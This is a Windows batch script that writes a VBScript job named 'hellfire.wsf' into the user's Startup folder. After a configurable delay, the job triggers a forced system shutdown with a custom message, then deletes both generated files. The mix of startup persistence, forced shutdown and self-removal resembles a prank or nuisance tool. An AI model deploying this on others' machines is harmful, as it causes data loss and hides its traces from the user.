@echo off
REM set /p ceta=<conf/wsfname.txt
REM echo %ceta%
REM pause
del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf" >nul
REM del "conf\wsfname.txt"
REM set /p wsfnew=<conf/wsfname_new.txt
REM echo %wsfnew%
REM pause

echo ^<package^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^<job id="vbs"^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^<script language="VBScript"^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo set WshShell = WScript.CreateObject("WScript.Shell") >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
set /p zeit=<conf/zeitinmillisekunden.cfg
echo WScript.Sleep %zeit% >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo Set var2 = CreateObject("WScript.Shell") >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo var2.run "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^</script^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^</job^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^</package^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
set /p nachricht=<conf/nachricht.cfg
del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
set /p reakz=<conf/reaktionszeit.cfg
echo shutdown -s -f -t %reakz% -c "%nachricht%" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf" /s /q >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd" /s /q >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
start "" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
REM pause